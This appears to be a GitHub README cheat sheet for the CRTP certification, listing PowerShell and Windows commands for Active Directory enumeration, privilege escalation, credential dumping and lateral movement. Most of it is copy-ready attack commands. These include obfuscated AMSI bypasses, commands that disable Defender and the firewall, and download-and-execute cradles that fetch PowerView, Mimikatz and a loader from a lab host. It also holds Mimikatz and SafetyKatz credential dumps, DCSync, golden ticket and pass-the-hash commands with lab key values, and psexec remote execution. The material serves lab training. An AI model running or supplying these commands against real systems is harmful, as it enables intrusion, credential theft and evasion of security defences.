# CRTP_Skid
Command/tooling reference material useful for the CRTP course and Active Directory post-exploitation.

- [CRTP AD Attacks](#CRTP-Skid)
  - [Shell Prep & Defense Evasion](#Shell-Prep-&-Defense-Evasion)  
    - [Invisi-Shell](#Invisi-Shell)
    - [AMSI Bypass](#AMSI-Bypass)
  - [Domain Enumeration](#Domain-Enumeration)  
    - [Powerview](#Powerview)
      - [Domain](#Domain-Enum)
      - [Domain Trust](#Domain-Trust)
      - [Users](#Users)
      - [Computers](#Computers)
      - [Groups](#Groups)
      - [User Hunting](#User-Hunting)
      - [Share Enum](#Share-Enum)
      - [GPO](#Group-Policy-Objects)
      - [Access Control Lists](#Access-Control-Lists)
    - [Windows CLI](#Windows-CLI)
    - [AD PowerShell Module](#Active-Directory-PowerShell-Module)
   - [Local Privilege Escalation](#Local-Privilege-Escalation) 
   - [Domain Privilege Escalation](#Domain-Privilege-Escalation)
     - [Unconstrained Delegation](#Unconstrained-Delegation)
     - [Constrained Delegation](#Constrained-Delegation)
     - [Golden Ticket](#Golden-Ticket)
     - [Silver Ticket](#Silver-Ticket)
     - [OverPass-the-Hash](#OverPass-the-Hash)
   - [Credential Access](#Credential-Access)
     - [Mimikatz](#Mimikatz)
   - [Lateral Movement](#Lateral-Movement)
   - [Other Tooling](#Tooling)
      - [Bloodhound](#Bloodhound)
    - [Links](#Links)
      - [User Hunting](#User_Hunting)

## Shell Prep & Defense Evasion

### [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)
Invisi-Shell is used in the labs to bypass PowerShell security features by hooking .NET assemblies. Invisi-Shell a batch file for execution (two batch files dependant on current privilege level) that reference the invisi-shell DLL. Note - Invisi-shell may break certain functionality of certain programs run within shell.
```powershell
C:\Path\RunWithRegistryNonAdmin.bat 
C:\Path\RunWithPathAsAdmin.bat
```
### AMSI Bypass 
More AMSI Bypass techniques [here](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)

#### ‘Plain’ AMSI bypass example:
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
#### Obfuscation example for copy-paste purposes:
```powershell
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
#### Another bypass, which is not detected by PowerShell autologging:
```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```
#### Bypass AMSI with administrative access
```powershell
Set-MpPreference -DisableIOAVProtection $true
```
## Domain Enumeration 
### Powerview 
Powerview is referenced quite a bit in the course material, but the Microsoft-signed AD PowerShell Module can also be used and will typically evade AV sigs where PowerView may not if using an unmodified version. 

#### Domain Enum

```powershell 
Get-NetDomain
Get-DomainSID
Get-DomainPolicy (Get-DomainPolicy)."System Access" net accounts
Get-NetDomain -Domain <domainname>
```
#### Domain Trust

```powershell 
Get-NetDomainTrust
Get-NetForest
Get-NetForestDomain
Get-NetforestDomain -Forest <domain name>
Get-NetForestCatalog
Get-NetForestCatalog -Forest <domain name>
Get-NetForestTrust
Get-NetForestTrust -Forest <domain name>
Get-NetForestDomain -Verbose | Get-NetDomainTrust
```
#### Users 
```powershell 
Get-NetUser
Get-NetUser -Username <username>
Get-NetUser | select samaccountname
Get-NetUser | select samaccountname, lastlogon, pwdlastset
Get-NetUser | select samaccountname, lastlogon, pwdlastset | Sort-Object -Property lastlogon
Get-NetUser | select samaccountname, memberof
Get-netuser | Select-Object samaccountname,description
get-userproperty -Properties pwdlastset
Find-UserField -SearchField Description -SearchTerm "built"
Get-DomainUser | select -ExpandProperty samaccountname
```
#### Computers
```powershell 
Get-DomainComputer | select -ExpandProperty dnshostname
Get-NetDomainController
Get-NetDomainController | select-object Name
Get-NetComputer
Get-NetComputer -FullData
Get-NetComputer -Computername <computername> -FullData
Get-NetComputer -OperatingSystem "*Server 2016*"
Get-NetComputer -fulldata | select samaccountname, operatingsystem, operatingsystemversion
Get-NetLoggedon -Computername <computername>
Get-LoggedonLocal -Computername <computername>
Get-LastLoggedOn -ComputerName <computername>
```
#### Groups
```powershell
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins"
Get-NetGroup
Get-NetGroup -GroupName *admin*
Get-NetGroup -Domain <domain>
Get-NetGroupMember -Groupname "Domain Admins" -Recurse
Get-NetGroupMember -Groupname "Domain Admins" -Recurse | select MemberName
Get-NetGroup -Username <username>
Get-NetlocalGroup -Computername <computername> -ListGroups
Get-NetlocalGroup -Computername <computername> -Recurse
```
#### User Hunting
```powershell
Invoke-UserHunter
Invoke-UserHunter -GroupName <name>
Invoke-UserHunter -CheckAccess
Invoke-UserHunter -Stealth
Find-LocalAdminAccess -Verbose
Find-DomainUserLocation -Verbose
Find-DomainUserLocation -UserGroupIdentity "Group"
```
#### Share Enum

```powershell 
Invoke-ShareFinder -Verbose
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC
Invoke-FileFinder -Verbose
Get-NetFileServer
```
#### Access Control Lists

```powershell 
Get-ObjectACL -SamAccountName <accountname> -ResolveGUIDS
Get-ObjectACL -ADSprefix ‘CN=Administrator,CN=Users’ -Verbose
Get-PathAcl -Path \\<Domain controller>\sysvol
Invoke-ACLScanner -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
```

#### Group Policy Objects 

```powershell 
Get-NetGPO
Get-NetGPO -Computername <computername>
Get-NetGPOGroup
Find-GPOComputerAdmin -Computername <computername>
Find-GPOLocation -Username user -Verbose
Get-NetOU -Fulldata
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
Get-NetGPO -GPOname "{<gplink>}"
```
#### Active Directory PowerShell Module
- [Microsofts AD PowerShell](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) module can also be used for domain enumeration. 
### Windows CLI
Useful post-exploitation commands
#### Windows Defender
```powershell 
#Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true
#Check exclusion paths 
Get-MpPreference | select-object -ExpandProperty ExclusionPath
#Add Exclusion Path
Add-MpPreference -ExclusionPath "path"
```
#### Windows Network Configuration 
```powershell 
#### Add redirect in network config for specific port/ip
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
```
#### File Copy or Reflectively load script/PE
```powershell
Copy-Item .\script.ps1 \\<servername>\c$\'Program Files'
echo F | xcopy path \\hostt\C$\Users\Public\file.exe
###Invoke-Expression
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
###Invoke-WebRequest
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
```
#### Check if AppLocker configured
```powershell
#hunt for overly permissive policies
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
#### Disable Windows Firewall
```powershell
netsh advfirewall set allprofiles state off
```
## Local Privilege Escalation
Techniques relevant to abusing AD/system misconfiguration and normal Windows functionality to achieve privesc. 
#### Privesc tools/scripts
- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- [PrivEsc](https://github.com/enjoiz/Privesc)

#### PowerView

```powershell 
Get-ServiceUnquoted -Verbose 
Get-ModifiableServiceFile -Verbose
Get-ModifiableService -Verbose 
```

#### PowerUp
```powershell 
. .\PowerUp.ps1
Invoke-AllChecks
Invoke-ServiceAbuse -name 'service' -UserName 'user'
```
#### Privesc
```powershell 
Invoke-PrivEsc
```
#### PrivescCheck
```powershell 
Invoke-Privesc Check
```
#### PEASS-ng
```powershell 
winPEASx64.exe
```
## Domain Privilege Escalation
### Unconstrained Delegation
Delegation is the action of allowing a computer to save a user’s Kerberos authentication tickets, then use those tickets to impersonate the user and act on that user’s behalf.
```powershell
Check for unconstrained delegation with PowerView 
Get-Netcomputer -UnConstrained
Get-Netcomputer -UnConstrained | select samaccountname
```
Leverage Mimikatz to to check for DA tokens and export them. May have to wait for a login
```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
```
### Constrained Delegation 
Constrained delegation allows the account with the “Trust this user/computer for delegation to specified services only” enabled to impersonate ANY user to access specific services listed in the allowable delegation list.
#### Enumerate Users
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```
#### Enumerate Computers
```powershell
Get-Domaincomputer -TrustedToAuth
Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```
### Golden Ticket
With krbtgt creds, create a golden ticket for domain persistence
```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-
1874506631-3219952063-538504511 /aes256:e28b3a5c60e087c8489a410a1199235efaf3b9f125972c7a1e7618a7469bfd6a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
### mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21- 1874506631-3219952063-538504511 /aes256:e28b3a5c60e087c8489a410a1199235efaf3b9f125972c7a1e7618a7469bfd6a id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
### Silver Ticket
### OverPass-the-Hash
#### Rubeus
```powershell 
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
#### Mimikatz
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /run:powershell.exe"'
```
#### Safetykatz
```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /run:cmd.exe" "exit"
```
## Credential Access 
I would recommend becoming familiar with different tooling that can be used to dump creds. 
### Mimikatz 
"privilege::debug" grants account SeDebugPrivilege. Dumps Local Users
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
```
```powershell
#Dump Logon Passwords
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
#Dump Windows Secrets
Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"
vault::list
vault::cred /patch
#Dump Kerberos Encryption Keys
Invoke-Mimikatz –Command '"sekurlsa::ekeys"
```
Get krbtgt hash on a DC
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
```
Get/Set SID history for enterprise admin group
```powershell 
Get-NetGroup -Domain <domain> -GroupName "Enterprise Admins" -FullData | select samaccountname, objectsid
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /sids:<sids> /krbtgt:<hash> /ticket:<path to save ticket>"'
```
Inject Ticket
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt <path to ticket>"'
```
DCSync (need LDAP SPN)
```powershell 
lsadump::dcsync /user:DOMAIN\krbtgt /domain:targetdomain.com
### SafetyKatz
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```
Over-Pass-the-Hash (SafetyKatz.exe)
```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:user /domain:domain /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /run:cmd.exe" "exit"
```
Copy Loader to target system, modify local firewall rules, and execute SafetyKatz 
```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\target\C$\Users\Public\Loader.exe /Y
#On Target System
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
#Execute Mimikatz
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
#Dump creds
lsadump::lsa /patch
#or in one command
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```
## Lateral Movement
All the PS remoting 

```powershell 
$Sess = New-PSSession –Computername IP
Invoke-Command –Session $Sess –ScriptBlock {$Proc = Get-Process}
Invoke-Command –Session $Sess –ScriptBlock {$Proc.Name}
```
Execute commands/Files on remote hosts
```powershell 
Invoke-Command -Computername <computername> -Scriptblock {whoami} 
Invoke-Command -Scriptblock {whoami} $sess

Invoke-Command -Computername <computername> -FilePath <path>
Invoke-Command -FilePath <path> $sess
```
### Host Script Locally and execute on remote system via PS Remoting 
```powershell
##Load Mimikatz on host machine
iex (iwr http://172.16.100.X/Invoke-Mimikatz.ps1 -UseBasicParsing)
##Enter PSRemoting session for target host 
$sess = New-PSSession -ComputerName host
##Bypass AMSI (if administrator)
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
##Load mimikatz
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
##dump creds
sekurlsa::logonpasswords
```
Windows Remote Management ([winrs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs))

```powershell 
winrs -remote:server1 -u:server1\administrator - p:Pass@1234 hostname
winrs -r:host cmd
```
PsExec is always fun. Standalone or via Impacket.
```powershell 
psexec.py domain\user -target-ip IP -k -no-pass
psexec.py domain\user@IP -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
psexec \\IP -accepteula -i -u domain\user -p pass cmd.exe
psexec \\IP -accepteula -i -u domain\user -p pass cmd.exe /k "ipconfig"
psexec \\IP -accepteula -i -u domain\user -p pass cmd.exe /k "C:\myscript.bat"

```
## Tooling 

I found that the covered tooling in the course is sufficient for achieving CLI access across the hosts in the exam. However, some of the techniques and tools used in the course will not work in the exam due to .NET dependancies. 


#### Bloodhound
Set up Bloodhound/Neo4J on your host before the exam. I ran in to an issue involving OpenJDK vesioning with Neo4J on Catalina, as well as an issue ingesting the collected data using the latest version of Bloodhound. I used the below workarounds. 
- Bloodhound version 9.4.0 (OSX)
  - If you run in to Bloodhound error "file created from incompatible collector" upon import of collected .json files, try running an older version of Bloodhound. See [this](https://github.com/fox-it/Bloodhound.py/issues/69) 
- Neo4J 4.4.9 (OSX)
  - Install older version of OpenJDK 11+ if you run in to issues. See [this](https://gist.github.com/drm317/3e2a9ce4ba1288c4fbaab1e534d71133)

```powershell 
#Start neo4j 
./neo4j console 
#if java version issues, jabba use openjdk@1.11.0
#Run collectors 
. ./sharphound.ps1
Invoke-Bloodhound -CollectionMethod all -Verbose
Invoke-Bloodhound -CollectionMethod LoggedOn -Verbose
```
## Links
- [User Hunting](https://sixdub.medium.com/derivative-local-admin-cdd09445aac8)
- [PowerShell Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)
- [PowerShell Obfuscation (Invoke-Obfuscation)](https://github.com/danielbohannon/Invoke-Obfuscation) 
- [OverPass-the-Hash](https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/)
